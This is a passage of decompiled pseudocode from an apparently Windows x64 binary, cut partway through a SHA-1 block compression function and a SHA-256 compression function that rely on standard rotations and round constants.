  int v332; // [rsp+2Ch] [rbp-5Ch]
  int v333; // [rsp+30h] [rbp-58h]
  int v334; // [rsp+30h] [rbp-58h]
  int v336; // [rsp+98h] [rbp+10h]
  int v337; // [rsp+98h] [rbp+10h]
  int v338; // [rsp+98h] [rbp+10h]
  int v339; // [rsp+98h] [rbp+10h]
  int v340; // [rsp+A0h] [rbp+18h]
  int v341; // [rsp+A0h] [rbp+18h]
  int v342; // [rsp+A0h] [rbp+18h]
  int v343; // [rsp+A0h] [rbp+18h]
  int v344; // [rsp+A8h] [rbp+20h]
  int v345; // [rsp+A8h] [rbp+20h]
  int v346; // [rsp+A8h] [rbp+20h]
  int v347; // [rsp+A8h] [rbp+20h]

  v2 = a2;
  v3 = a1[2];
  v4 = a1[1];
  v5 = a1[3];
  v6 = *a2;
  v7 = a2[1];
  v8 = a2[2];
  v9 = a2[3];
  v10 = a2[4];
  v11 = a2[5];
  v12 = __ROR4__(v4, 2);
  v13 = a1[4] + __ROL4__(*a1, 5) + (v5 ^ v4 & (v3 ^ v5)) + v6 + 1518500249;
  v14 = __ROR4__(*a1, 2);
  v15 = v5 + 1518500249 + v7 + __ROL4__(v13, 5) + (v3 ^ *a1 & (v12 ^ v3));
  v16 = v13 & (v14 ^ v12);
  v17 = __ROR4__(v13, 2);
  v18 = v3 + 1518500249 + v8 + __ROL4__(v15, 5) + (v12 ^ v16);
  v19 = v14 ^ v15 & (v14 ^ v17);
  v20 = __ROR4__(v15, 2);
  v21 = v9 + __ROL4__(v18, 5) + v19 + v12 + 1518500249;
  v22 = v18 & (v20 ^ v17);
  v23 = __ROR4__(v18, 2);
  v24 = v10 + __ROL4__(v21, 5) + (v17 ^ v22) + v14 + 1518500249;
  v25 = v17 + 1518500249 + v11 + __ROL4__(v24, 5) + (v20 ^ v21 & (v23 ^ v20));
  v26 = __ROR4__(v21, 2);
  v325 = v2[6];
  v27 = v23 ^ v24 & (v26 ^ v23);
  v28 = __ROR4__(v24, 2);
  v311 = v2[7];
  v29 = v325 + 1518500249 + __ROL4__(v25, 5) + v27 + v20;
  v30 = v311 + 1518500249 + __ROL4__(v29, 5) + (v26 ^ v25 & (v28 ^ v26));
  v31 = __ROR4__(v25, 2);
  v32 = v30 + v23;
  v297 = v2[8];
  v33 = v28 ^ v29 & (v28 ^ v31);
  v34 = __ROR4__(v29, 2);
  v35 = v26 + 1518500249 + v33 + __ROL4__(v32, 5) + v297;
  v36 = v31 ^ v32 & (v34 ^ v31);
  v302 = v2[9];
  v37 = __ROR4__(v32, 2);
  v329 = v2[10];
  v38 = v302 + 1518500249 + __ROL4__(v35, 5) + v36 + v28;
  v39 = v34 ^ v35 & (v37 ^ v34);
  v40 = __ROR4__(v35, 2);
  v41 = v31 + 1518500249 + v39 + __ROL4__(v38, 5) + v329;
  v42 = v37 ^ v38 & (v40 ^ v37);
  v318 = v2[11];
  v43 = __ROR4__(v38, 2);
  v322 = v2[12];
  v44 = v318 + 1518500249 + __ROL4__(v41, 5) + v42 + v34;
  v45 = v322 + 1518500249 + __ROL4__(v44, 5) + (v40 ^ v41 & (v43 ^ v40));
  v46 = __ROR4__(v41, 2);
  v47 = v45 + v37;
  v288 = v2[13];
  v48 = v44 & (v43 ^ v46);
  v49 = __ROR4__(v44, 2);
  v50 = v288 + 1518500249 + __ROL4__(v47, 5) + (v43 ^ v48) + v40;
  v340 = v2[14];
  v336 = v2[15];
  v51 = v46 ^ v47 & (v49 ^ v46);
  v52 = __ROR4__(v47, 2);
  v53 = v340 + 1518500249 + __ROL4__(v50, 5) + v51 + v43;
  v54 = __ROL4__(v53, 5);
  v55 = v50 & (v52 ^ v49);
  v56 = __ROR4__(v50, 2);
  v57 = v52 ^ v53 & (v56 ^ v52);
  v58 = __ROR4__(v53, 2);
  LODWORD(v2) = v46 + 1518500249 + (v49 ^ v55) + v54 + v336;
  v344 = __ROL4__(v6 ^ v8 ^ v297 ^ v288, 1);
  v59 = v49 + 1518500249 + v344 + __ROL4__((_DWORD)v2, 5) + v57;
  v308 = __ROL4__(v7 ^ v9 ^ v302 ^ v340, 1);
  v61 = v325;
  v60 = v52 + 1518500249 + v308 + __ROL4__(v59, 5) + (v56 ^ (unsigned int)v2 & (v58 ^ v56));
  v62 = v329;
  LODWORD(v2) = __ROR4__((_DWORD)v2, 2);
  v63 = v58 ^ v59 & (v58 ^ (unsigned int)v2);
  v293 = __ROL4__(v8 ^ v10 ^ v329 ^ v336, 1);
  v64 = __ROR4__(v59, 2);
  v65 = v56 + v293 + 1518500249 + __ROL4__(v60, 5) + v63;
  v315 = __ROL4__(v344 ^ v9 ^ v11 ^ v318, 1);
  v66 = v58 + 1518500249 + ((unsigned int)v2 ^ v60 & (v64 ^ (unsigned int)v2)) + __ROL4__(v65, 5) + v315;
  v67 = __ROR4__(v60, 2);
  v330 = __ROL4__(v293 ^ v11 ^ v311 ^ v288, 1);
  v68 = (v65 ^ v67 ^ v64) + 1859775393;
  v326 = __ROL4__(v308 ^ v10 ^ v325 ^ v322, 1);
  v69 = __ROR4__(v65, 2);
  v70 = (_DWORD)v2 + v68 + __ROL4__(v66, 5) + v326;
  v71 = v66 ^ v69 ^ v67;
  v72 = __ROR4__(v66, 2);
  v73 = v64 + 1859775393 + v71 + __ROL4__(v70, 5) + v330;
  v74 = v297;
  v75 = __ROL4__(v315 ^ v61 ^ v297 ^ v340, 1);
  v76 = v69 ^ v70;
  v77 = __ROR4__(v70, 2);
  v78 = v75 + __ROL4__(v73, 5) + 1859775393 + (v72 ^ v76) + v67;
  v79 = v72 ^ v73 ^ v77;
  v298 = __ROL4__(v326 ^ v311 ^ v302 ^ v336, 1);
  v80 = __ROR4__(v73, 2);
  v81 = v298 + 1859775393 + __ROL4__(v78, 5) + v79 + v69;
  LODWORD(v2) = v74 ^ v62;
  v82 = v330;
  LODWORD(v2) = __ROL4__(v344 ^ v330 ^ (unsigned int)v2, 1);
  v83 = v78 ^ v80 ^ v77;
  v84 = __ROR4__(v78, 2);
  v85 = (_DWORD)v2 + __ROL4__(v81, 5) + 1859775393 + v83 + v72;
  v86 = v81 ^ v84 ^ v80;
  v312 = __ROL4__(v308 ^ v75 ^ v302 ^ v318, 1);
  v87 = __ROR4__(v81, 2);
  v88 = v62 ^ v322;
  v89 = v312 + 1859775393 + __ROL4__(v85, 5) + v86 + v77;
  v90 = v298;
  v91 = v85 ^ v87 ^ v84;
  v305 = __ROL4__(v293 ^ v298 ^ v88, 1);
  v92 = __ROR4__(v85, 2);
  v93 = v288;
  v94 = v305 + 1859775393 + __ROL4__(v89, 5) + v91 + v80;
  v289 = __ROL4__(v315 ^ (unsigned int)v2 ^ v318 ^ v288, 1);
  v95 = v92 ^ v87 ^ v89;
  v96 = __ROR4__(v89, 2);
  v97 = v289 + 1859775393 + __ROL4__(v94, 5) + v95 + v84;
  v331 = __ROL4__(v326 ^ v312 ^ v322 ^ v340, 1);
  v98 = v94 ^ v96;
  v99 = __ROR4__(v94, 2);
  v100 = v331 + __ROL4__(v97, 5) + 1859775393 + (v92 ^ v98) + v87;
  v101 = v305 ^ v93 ^ v336;
  v102 = v293;
  v299 = __ROL4__(v82 ^ v101, 1);
  v103 = v97 ^ v99 ^ v96;
  v104 = __ROR4__(v97, 2);
  v105 = v299 + __ROL4__(v100, 5) + 1859775393 + v103 + v92;
  v106 = v100 ^ v104 ^ v99;
  v341 = __ROL4__(v344 ^ v75 ^ v289 ^ v340, 1);
  v107 = __ROR4__(v100, 2);
  v108 = v341 + 1859775393 + __ROL4__(v105, 5) + v106 + v96;
  v109 = v105 ^ v107 ^ v104;
  v337 = __ROL4__(v308 ^ v90 ^ v331 ^ v336, 1);
  v110 = __ROR4__(v105, 2);
  v111 = v337 + 1859775393 + __ROL4__(v108, 5) + v109 + v99;
  v112 = v110 ^ v107 ^ v108;
  v113 = __ROL4__(v344 ^ v293 ^ (unsigned int)v2 ^ v299, 1);
  v114 = __ROR4__(v108, 2);
  v115 = v113 + __ROL4__(v111, 5) + 1859775393 + v112 + v104;
  v116 = v110 ^ v111 ^ v114;
  v294 = __ROL4__(v308 ^ v315 ^ v312 ^ v341, 1);
  v117 = __ROR4__(v111, 2);
  v118 = v294 + 1859775393 + __ROL4__(v115, 5) + v116 + v107;
  v119 = v102 ^ v326 ^ v305 ^ v337;
  v120 = v289;
  v319 = __ROL4__(v119, 1);
  v121 = v115 ^ v117 ^ v114;
  v122 = __ROR4__(v115, 2);
  v123 = v319 + __ROL4__(v118, 5) + 1859775393 + v121 + v110;
  v124 = v118 ^ v122 ^ v117;
  v290 = __ROL4__(v113 ^ v315 ^ v82 ^ v289, 1);
  v125 = __ROR4__(v118, 2);
  v126 = v290 + 1859775393 + __ROL4__(v123, 5) + v124 + v114;
  v345 = __ROL4__(v294 ^ v326 ^ v75 ^ v331, 1);
  v127 = v345 + 1859775393 + __ROL4__(v126, 5) + (v123 ^ v125 ^ v122) + v117;
  v128 = __ROR4__(v123, 2);
  v129 = v125 ^ v126;
  v130 = __ROR4__(v126, 2);
  v131 = v312;
  v309 = __ROL4__(v319 ^ v82 ^ v90 ^ v299, 1);
  v132 = v309 + 1859775393 + __ROL4__(v127, 5) + (v128 ^ v129) + v122;
  v133 = v305;
  v134 = v128 ^ v127 ^ v130;
  v323 = __ROL4__(v290 ^ v75 ^ (unsigned int)v2 ^ v341, 1);
  v135 = __ROR4__(v127, 2);
  v136 = v323 + 1859775393 + __ROL4__(v132, 5) + v134 + v125;
  v137 = v132 ^ v135 ^ v130;
  v313 = __ROL4__(v345 ^ v90 ^ v312 ^ v337, 1);
  v138 = __ROR4__(v132, 2);
  v139 = v128 + 1859775393 + v137 + __ROL4__(v136, 5) + v313;
  v316 = __ROL4__(v113 ^ v309 ^ (unsigned int)v2 ^ v305, 1);
  v140 = v136 & v138 | v135 & (v136 | v138);
  v141 = __ROR4__(v136, 2);
  v142 = v294;
  v143 = v130 + v316 + v140 + __ROL4__(v139, 5) - 1894007588;
  v306 = __ROL4__(v294 ^ v323 ^ v131 ^ v120, 1);
  v144 = v139 & v141;
  v145 = v138 & (v139 | v141);
  v146 = __ROR4__(v139, 2);
  v147 = v135 + v306 + (v144 | v145);
  v148 = v313 ^ v133 ^ v331;
  v149 = v146 & v143;
  v150 = v319;
  v151 = v147 + __ROL4__(v143, 5) - 1894007588;
  v303 = __ROL4__(v319 ^ v148, 1);
  v152 = v141 & (v146 | v143);
  v153 = __ROR4__(v143, 2);
  v154 = v290;
  v155 = v138 + v303 + (v149 | v152) + __ROL4__(v151, 5) - 1894007588;
  v295 = __ROL4__(v290 ^ v316 ^ v120 ^ v299, 1);
  v291 = __ROL4__(v345 ^ v306 ^ v331 ^ v341, 1);
  v156 = v141 + v295 + (v151 & v153 | v146 & (v151 | v153));
  v157 = __ROR4__(v151, 2);
  v158 = v156 + __ROL4__(v155, 5) - 1894007588;
  v159 = v155 & v157;
  v160 = v153 & (v155 | v157);
  v161 = __ROR4__(v155, 2);
  v162 = v146 + v291 + (v159 | v160) + __ROL4__(v158, 5) - 1894007588;
  v300 = __ROL4__(v309 ^ v303 ^ v299 ^ v337, 1);
  v163 = v158 & v161 | v157 & (v158 | v161);
  v164 = __ROR4__(v158, 2);
  v338 = __ROL4__(v142 ^ v313 ^ v291 ^ v337, 1);
  v165 = v153 + v300 + v163 + __ROL4__(v162, 5) - 1894007588;
  v342 = __ROL4__(v113 ^ v323 ^ v295 ^ v341, 1);
  v166 = v162 & v164;
  v167 = v161 & (v162 | v164);
  v168 = __ROR4__(v162, 2);
  v169 = v342 + (v166 | v167);
  v170 = v168 & v165;
  v171 = v157 + v169 + __ROL4__(v165, 5) - 1894007588;
  v320 = __ROL4__(v142 ^ v154 ^ v306 ^ v342, 1);
  v172 = v164 & (v168 | v165);
  v173 = __ROR4__(v165, 2);
  v174 = v170 | v172;
  v175 = v171 & v173;
  v176 = v161 + v338 + v174 + __ROL4__(v171, 5) - 1894007588;
  v177 = v168 & (v171 | v173);
  v178 = __ROR4__(v171, 2);
  v327 = __ROL4__(v113 ^ v150 ^ v316 ^ v300, 1);
  v179 = v164 + v327 + (v175 | v177) + __ROL4__(v176, 5) - 1894007588;
  v180 = v345;
  v181 = v168 + v320 + (v176 & v178 | v173 & (v176 | v178)) + __ROL4__(v179, 5) - 1894007588;
  v182 = __ROR4__(v176, 2);
  v183 = v150 ^ v345 ^ v303 ^ v338;
  v184 = v309;
  v346 = __ROL4__(v183, 1);
  LODWORD(v2) = v154 ^ v309 ^ v295;
  v185 = v323;
  v186 = v346 + (v179 & v182 | v178 & (v179 | v182));
  v187 = __ROR4__(v179, 2);
  v188 = v313;
  v189 = v173 + v186 + __ROL4__(v181, 5) - 1894007588;
  v310 = __ROL4__(v327 ^ (unsigned int)v2, 1);
  v190 = v181 & v187;
  v324 = __ROL4__(v320 ^ v180 ^ v323 ^ v291, 1);
  v191 = v182 & (v181 | v187);
  v192 = __ROR4__(v181, 2);
  v314 = __ROL4__(v346 ^ v184 ^ v313 ^ v300, 1);
  v193 = v310 + (v190 | v191);
  v194 = v192 & v189;
  v195 = v178 + v193 + __ROL4__(v189, 5) - 1894007588;
  v196 = v192 | v189;
  v197 = __ROR4__(v189, 2);
  v198 = v182 + v324 + (v194 | v187 & v196) + __ROL4__(v195, 5) - 1894007588;
  v199 = __ROL4__(v198, 5) + v314 + (v195 & v197 | v192 & (v195 | v197)) - 1894007588 + v187;
  v200 = __ROR4__(v195, 2);
  v332 = __ROL4__(v310 ^ v185 ^ v316 ^ v342, 1);
  v201 = v303;
  v202 = v332 + (v198 & v200 | v197 & (v198 | v200));
  v203 = __ROR4__(v198, 2);
  v333 = __ROL4__(v324 ^ v188 ^ v306 ^ v338, 1);
  v204 = v199 & v203;
  LODWORD(v2) = v192 - 1894007588 + v202 + __ROL4__(v199, 5);
  v205 = v200 & (v199 | v203);
  v206 = __ROR4__(v199, 2);
  v207 = v197 - 1894007588 + v333 + (v204 | v205) + __ROL4__((_DWORD)v2, 5);
  v208 = v295;
  v209 = (unsigned int)v2 & v206 | v203 & ((unsigned int)v2 | v206);
  LODWORD(v2) = __ROR4__((_DWORD)v2, 2);
  v304 = __ROL4__(v327 ^ v314 ^ v316 ^ v303, 1);
  v210 = v200 + v304 + v209 + __ROL4__(v207, 5) - 1894007588;
  v296 = __ROL4__(v320 ^ v332 ^ v306 ^ v295, 1);
  v211 = v203 + v296 + ((unsigned int)v2 & v207 | v206 & ((unsigned int)v2 | v207)) + __ROL4__(v210, 5) - 1894007588;
  v212 = __ROR4__(v207, 2);
  v317 = __ROL4__(v346 ^ v333 ^ v201 ^ v291, 1);
  v213 = v210 & v212 | (unsigned int)v2 & (v210 | v212);
  v214 = __ROR4__(v210, 2);
  v307 = __ROL4__(v310 ^ v304 ^ v208 ^ v300, 1);
  v301 = __ROL4__(v314 ^ v317 ^ v300 ^ v338, 1);
  v215 = v211 & v214;
  v216 = v206 + v317 + v213 + __ROL4__(v211, 5) - 1894007588;
  v217 = v212 & (v211 | v214);
  v218 = __ROR4__(v211, 2);
  v219 = (_DWORD)v2 - 1894007588 + v307 + (v215 | v217);
  v220 = (v216 ^ v218 ^ v214) - 899497514;
  v221 = v219 + __ROL4__(v216, 5);
  v222 = __ROR4__(v216, 2);
  v223 = __ROL4__(v324 ^ v296 ^ v291 ^ v342, 1);
  v224 = v212 + v223 + v220 + __ROL4__(v221, 5);
  v292 = v223;
  v343 = __ROL4__(v327 ^ v332 ^ v307 ^ v342, 1);
  v225 = v301 + (v221 ^ v222 ^ v218);
  v226 = __ROR4__(v221, 2);
  v227 = v214 + v225 + __ROL4__(v224, 5) - 899497514;
  v228 = v343 + (v226 ^ v222 ^ v224);
  v229 = __ROR4__(v224, 2);
  v230 = v218 + v228 + __ROL4__(v227, 5) - 899497514;
  v339 = __ROL4__(v320 ^ v333 ^ v223 ^ v338, 1);
  v231 = v226 ^ v227 ^ v229;
  v232 = __ROR4__(v227, 2);
  v233 = v222 + v339 + v231 + __ROL4__(v230, 5) - 899497514;
  v234 = __ROL4__(v320 ^ v310 ^ v296 ^ v343, 1);
  LODWORD(v2) = __ROL4__(v346 ^ v324 ^ v317 ^ v339, 1);
  v321 = __ROL4__(v327 ^ v346 ^ v304 ^ v301, 1);
  v235 = v321 + (v230 ^ v232 ^ v229);
  v236 = __ROR4__(v230, 2);
  v328 = v234;
  v237 = __ROL4__(v321 ^ v310 ^ v314 ^ v307, 1);
  v238 = v226 + v235 + __ROL4__(v233, 5) - 899497514;
  v239 = v234 + (v233 ^ v236 ^ v232);
  v240 = __ROR4__(v233, 2);
  v241 = v229 + v239 + __ROL4__(v238, 5) - 899497514;
  v242 = (_DWORD)v2 + (v238 ^ v240 ^ v236);
  v243 = __ROR4__(v238, 2);
  v244 = v232 + v242 + __ROL4__(v241, 5) - 899497514;
  v245 = v236 + v237 + (v243 ^ v240 ^ v241) + __ROL4__(v244, 5) - 899497514;
  v246 = __ROR4__(v241, 2);
  v247 = v333 ^ v296 ^ v339;
  v248 = __ROL4__(v234 ^ v324 ^ v332 ^ v223, 1);
  v249 = v248 + (v243 ^ v244 ^ v246);
  v250 = __ROR4__(v244, 2);
  v334 = __ROL4__((unsigned int)v2 ^ v314 ^ v333 ^ v301, 1);
  v251 = __ROL4__(v237 ^ v332 ^ v304 ^ v343, 1);
  v252 = __ROL4__(v248 ^ v247, 1);
  v253 = v240 + v249 + __ROL4__(v245, 5) - 899497514;
  v347 = v248;
  v254 = v245 ^ v250 ^ v246;
  v255 = __ROR4__(v245, 2);
  v256 = __ROL4__(v253, 5) + v334 + v254 - 899497514 + v243;
  v257 = v251 + (v253 ^ v255 ^ v250);
  v258 = __ROR4__(v253, 2);
  v259 = v246 - 899497514 + v257 + __ROL4__(v256, 5);
  v260 = v252 + (v256 ^ v258 ^ v255);
  v261 = __ROR4__(v256, 2);
  v262 = __ROL4__(v321 ^ v334 ^ v304 ^ v317, 1);
  v263 = v250 - 899497514 + v260 + __ROL4__(v259, 5);
  v264 = v255 - 899497514 + v262 + (v261 ^ v258 ^ v259) + __ROL4__(v263, 5);
  v265 = __ROR4__(v259, 2);
  v266 = (v261 ^ v263 ^ v265) - 899497514;
  v267 = __ROR4__(v263, 2);
  v268 = __ROL4__(v328 ^ v251 ^ v296 ^ v307, 1);
  v269 = __ROL4__((unsigned int)v2 ^ v252 ^ v317 ^ v292, 1);
  v270 = v258 + v268 + v266 + __ROL4__(v264, 5);
  v271 = v269 + (v264 ^ v267 ^ v265);
  v272 = __ROR4__(v264, 2);
  LODWORD(v2) = v261 - 899497514 + v271 + __ROL4__(v270, 5);
  v273 = (v270 ^ v272 ^ v267) - 899497514;
  v274 = __ROR4__(v270, 2);
  v275 = __ROL4__(v237 ^ v262 ^ v307 ^ v301, 1);
  v276 = __ROL4__(v347 ^ v268 ^ v292 ^ v343, 1);
  v277 = __ROL4__((_DWORD)v2, 5) + v275 + v273 + v265;
  v278 = (unsigned int)v2 ^ v274 ^ v272;
  LODWORD(v2) = __ROR4__((_DWORD)v2, 2);
  v279 = v267 - 899497514 + v276 + v278 + __ROL4__(v277, 5);
  v280 = v274 ^ v277;
  v281 = __ROR4__(v277, 2);
  v282 = v272 + ((unsigned int)v2 ^ v280) - 899497514 + __ROL4__(v279, 5) + __ROL4__(v334 ^ v269 ^ v301 ^ v339, 1);
  v283 = v279 ^ v281;
  v284 = __ROR4__(v279, 2);
  a1[3] += v284;
  v285 = v274 - 899497514 + ((unsigned int)v2 ^ v283) + __ROL4__(v282, 5) + __ROL4__(v321 ^ v251 ^ v343 ^ v275, 1);
  v286 = *a1 + (v282 ^ v284 ^ v281);
  a1[1] += v285;
  a1[2] += __ROR4__(v282, 2);
  result = (unsigned int)(v286 + __ROL4__(v285, 5) + (_DWORD)v2 + __ROL4__(v328 ^ v252 ^ v276 ^ v339, 1) - 899497514);
  a1[4] += v281;
  *a1 = result;
  return result;
}

//----- (000000013F1306E0) ----------------------------------------------------
__int64 __fastcall sub_13F1306E0(__int128 *a1, unsigned int *a2)
{
  __int128 v2; // xmm0
  __int128 v4; // xmm1
  __int64 v5; // rdi
  unsigned int v6; // ecx
  int v7; // er12
  int v8; // er14
  int v9; // er13
  int v10; // er10
  unsigned int v11; // ebx
  unsigned int v12; // er15
  unsigned int v13; // esi
  unsigned int v14; // er11
  unsigned int v15; // er8
  unsigned int v16; // edx
  unsigned int v17; // er8
  unsigned int v18; // er12
  unsigned int v19; // eax
  unsigned int v20; // er8
  int v21; // ebx
  unsigned int v22; // eax
  unsigned int v23; // er8
  unsigned int v24; // er13
  int v25; // er14
  unsigned int v26; // eax
  unsigned int v27; // er15
  unsigned int v28; // er8
  unsigned int v29; // esi
  int v30; // er10
  unsigned int v31; // eax
  unsigned int v32; // er8
  unsigned int v33; // esi
  int v34; // er11
  unsigned int v35; // eax
  unsigned int v36; // er8
  unsigned int v37; // ebx
  int v38; // er12
  unsigned int v39; // eax
  unsigned int v40; // er8
  unsigned int v41; // er13
  int v42; // ebx
  unsigned int v43; // eax
  unsigned int v44; // er8
  unsigned int v45; // er10
  unsigned int v46; // eax
  unsigned int v47; // er8
  unsigned int v48; // er14
  int v49; // er15
  unsigned int v50; // er8
  unsigned int v51; // er8
  unsigned int v52; // er12
  int v53; // er11
  unsigned int v54; // eax
  unsigned int v55; // esi
  unsigned int v56; // er8
  unsigned int v57; // ebx
  int v58; // er10
  unsigned int v59; // eax
  unsigned int v60; // er8
  unsigned int v61; // er13
  int v62; // esi
  unsigned int v63; // eax
  unsigned int v64; // er8
  unsigned int v65; // eax
  unsigned int v66; // er8
  unsigned int v67; // eax
  int v68; // er8
  unsigned int v69; // eax
  __int64 v70; // rcx
  unsigned int v71; // edx
  __int128 *v72; // r11
  __int64 result; // rax
  __m128i v74; // xmm0
  __m128i v75; // xmm1
  unsigned int v76; // [rsp+0h] [rbp-89h]
  unsigned int v77; // [rsp+0h] [rbp-89h]
  int v78; // [rsp+0h] [rbp-89h]
  unsigned int v79; // [rsp+0h] [rbp-89h]
  unsigned int v80; // [rsp+4h] [rbp-85h]
  unsigned int v81; // [rsp+8h] [rbp-81h]
  unsigned int v82; // [rsp+Ch] [rbp-7Dh]
  unsigned int v83; // [rsp+10h] [rbp-79h]
  unsigned int v84; // [rsp+14h] [rbp-75h]
  unsigned int v85; // [rsp+18h] [rbp-71h]
  unsigned int v86; // [rsp+1Ch] [rbp-6Dh]
  unsigned int v87; // [rsp+20h] [rbp-69h]
  unsigned int v88; // [rsp+24h] [rbp-65h]
  unsigned int v89; // [rsp+28h] [rbp-61h]
  unsigned int v90; // [rsp+2Ch] [rbp-5Dh]
  unsigned int v91; // [rsp+30h] [rbp-59h]
  unsigned int v92; // [rsp+34h] [rbp-55h]
  int v93; // [rsp+38h] [rbp-51h]
  unsigned int v94; // [rsp+38h] [rbp-51h]
  unsigned int v95; // [rsp+38h] [rbp-51h]
  unsigned int v96; // [rsp+3Ch] [rbp-4Dh]
  int v97; // [rsp+40h] [rbp-49h]
  __int128 v98; // [rsp+48h] [rbp-41h] BYREF
  __int128 v99; // [rsp+58h] [rbp-31h]
  __int64 v100; // [rsp+70h] [rbp-19h]
  __int64 v101; // [rsp+78h] [rbp-11h]
  __int64 v102; // [rsp+80h] [rbp-9h]
  __int64 v103; // [rsp+88h] [rbp-1h]
  __int64 v104; // [rsp+90h] [rbp+7h]
  __int64 v105; // [rsp+98h] [rbp+Fh]
  __int64 v106; // [rsp+A0h] [rbp+17h]
  __int64 v107; // [rsp+A8h] [rbp+1Fh]
  unsigned int v109; // [rsp+100h] [rbp+77h]
  unsigned int v110; // [rsp+108h] [rbp+7Fh]

  v2 = *a1;
  v4 = a1[1];
  v100 = 0i64;
  v5 = 0i64;
  v6 = 0;
  v101 = 0i64;
  v102 = 0i64;
  v104 = 0i64;
  v103 = 0i64;
  v105 = 0i64;
  v106 = 0i64;
  v107 = 0i64;
  v91 = 0;
  v109 = 0;
  v89 = 0;
  v87 = 0;
  v85 = 0;
  v83 = 0;
  v81 = 0;
  v98 = v2;
  v7 = HIDWORD(v2);
  v8 = DWORD2(v2);
  v9 = DWORD1(v2);
  v10 = v2;
  v99 = v4;
  v11 = HIDWORD(v4);
  v12 = DWORD1(v4);
  v13 = v4;
  v14 = DWORD2(v4);
  v88 = 0;
  v90 = 0;
  v86 = 0;
  v82 = 0;
  v84 = 0;
  v110 = 0;
  v15 = 0;
  v80 = 0;
  v92 = 0;
  do
  {
    if ( (_DWORD)v5 )
    {
      v96 = ((v6 >> 3) ^ __ROR4__(v6, 7) ^ __ROL4__(v6, 14))
          + v81
          + ((v109 >> 10) ^ __ROL4__(v109, 13) ^ __ROL4__(v109, 15))
          + v15;
      v16 = v96;
    }
    else
    {
      v16 = *a2;
      v96 = *a2;
    }
    v17 = v16
        + v11
        + *((_DWORD *)qword_13F1876B0 + v5)
        + (v14 ^ v13 & (v14 ^ v12))
        + (__ROR4__(v13, 6) ^ __ROL4__(v13, 7) ^ __ROR4__(v13, 11));
    v18 = v17 + v7;
    v93 = (v9 ^ (v10 ^ v9) & (v8 ^ v9)) + v17 + (__ROR4__(v10, 2) ^ __ROL4__(v10, 10) ^ __ROR4__(v10, 13));
    if ( (_DWORD)v5 )
      v19 = ((v110 >> 3) ^ __ROR4__(v110, 7) ^ __ROL4__(v110, 14))
          + v83
          + ((v91 >> 10) ^ __ROL4__(v91, 13) ^ __ROL4__(v91, 15))
          + v92;
    else
      v19 = a2[1];
    v92 = v19;
    v20 = v14
        + *((_DWORD *)qword_13F1876B0 + (unsigned int)(v5 + 1))
        + (v12 ^ v18 & (v13 ^ v12))
        + (__ROR4__(v18, 6) ^ __ROL4__(v18, 7) ^ __ROR4__(v18, 11))
        + v19;
    v76 = v20 + v8;
    v21 = v20 + (__ROL4__(v93, 10) ^ __ROR4__(v93, 13) ^ __ROR4__(v93, 2)) + (v10 ^ (v10 ^ v93) & (v10 ^ v9));
    if ( (_DWORD)v5 )
      v22 = ((v96 >> 10) ^ __ROL4__(v96, 13) ^ __ROL4__(v96, 15))
          + v85
          + ((v80 >> 3) ^ __ROR4__(v80, 7) ^ __ROL4__(v80, 14))
          + v110;
    else
      v22 = a2[2];
    v110 = v22;
    v23 = v12
        + *((_DWORD *)qword_13F1876B0 + (unsigned int)(v5 + 2))
        + (v13 ^ v76 & (v13 ^ v18))
        + (__ROR4__(v76, 6) ^ __ROL4__(v76, 7) ^ __ROR4__(v76, 11))
        + v22;
    v24 = v23 + v9;
    v25 = v23 + (__ROL4__(v21, 10) ^ __ROR4__(v21, 13) ^ __ROR4__(v21, 2)) + (v93 ^ (v21 ^ v93) & (v10 ^ v93));
    if ( (_DWORD)v5 )
      v26 = ((v92 >> 10) ^ __ROL4__(v92, 13) ^ __ROL4__(v92, 15))
          + v87
          + ((v82 >> 3) ^ __ROR4__(v82, 7) ^ __ROL4__(v82, 14))
          + v80;
    else
      v26 = a2[3];
    v27 = v76;
    v80 = v26;
    v28 = v13
        + *((_DWORD *)qword_13F1876B0 + (unsigned int)(v5 + 3))
        + (v18 ^ v24 & (v18 ^ v76))
        + (__ROR4__(v24, 6) ^ __ROL4__(v24, 7) ^ __ROR4__(v24, 11))
        + v26;
    v29 = v28 + v10;
    v77 = v28 + v10;
    v30 = v28 + (__ROR4__(v25, 2) ^ __ROL4__(v25, 10) ^ __ROR4__(v25, 13)) + (v21 ^ (v93 ^ v21) & (v25 ^ v21));
    if ( (_DWORD)v5 )
      v31 = ((v110 >> 10) ^ __ROL4__(v110, 13) ^ __ROL4__(v110, 15))
          + v89
          + ((v84 >> 3) ^ __ROR4__(v84, 7) ^ __ROL4__(v84, 14))
          + v82;
    else
      v31 = a2[4];
    v82 = v31;
    v32 = v18
        + *((_DWORD *)qword_13F1876B0 + (unsigned int)(v5 + 4))
        + (v27 ^ v29 & (v27 ^ v24))
        + (__ROR4__(v29, 6) ^ __ROL4__(v29, 7) ^ __ROR4__(v29, 11))
        + v31;
    v33 = v32 + v93;
    v34 = v32 + (__ROR4__(v30, 2) ^ __ROL4__(v30, 10) ^ __ROR4__(v30, 13)) + (v25 ^ (v21 ^ v25) & (v30 ^ v25));
    if ( (_DWORD)v5 )
      v35 = ((v86 >> 3) ^ __ROR4__(v86, 7) ^ __ROL4__(v86, 14))
          + v109
          + ((v80 >> 10) ^ __ROL4__(v80, 13) ^ __ROL4__(v80, 15))
          + v84;
    else
      v35 = a2[5];
    v84 = v35;
    v36 = v27
        + *((_DWORD *)qword_13F1876B0 + (unsigned int)(v5 + 5))
        + (v24 ^ v33 & (v24 ^ v77))
        + (__ROR4__(v33, 6) ^ __ROL4__(v33, 7) ^ __ROR4__(v33, 11))
        + v35;
    v37 = v36 + v21;
    v94 = v37;
    v38 = v36 + (__ROR4__(v34, 2) ^ __ROL4__(v34, 10) ^ __ROR4__(v34, 13)) + (v30 ^ (v25 ^ v30) & (v34 ^ v30));
    if ( (_DWORD)v5 )
      v39 = ((v88 >> 3) ^ __ROR4__(v88, 7) ^ __ROL4__(v88, 14))
          + v91
          + ((v82 >> 10) ^ __ROL4__(v82, 13) ^ __ROL4__(v82, 15))
          + v86;
    else
      v39 = a2[6];
    v86 = v39;
    v40 = v24
        + *((_DWORD *)qword_13F1876B0 + (unsigned int)(v5 + 6))
        + (v77 ^ v37 & (v77 ^ v33))
        + (__ROR4__(v37, 6) ^ __ROL4__(v37, 7) ^ __ROR4__(v37, 11))
        + v39;
    v41 = v40 + v25;
    v42 = v40 + (__ROR4__(v38, 2) ^ __ROL4__(v38, 10) ^ __ROR4__(v38, 13)) + (v34 ^ (v38 ^ v34) & (v30 ^ v34));
    if ( (_DWORD)v5 )
      v43 = ((v90 >> 3) ^ __ROR4__(v90, 7) ^ __ROL4__(v90, 14))
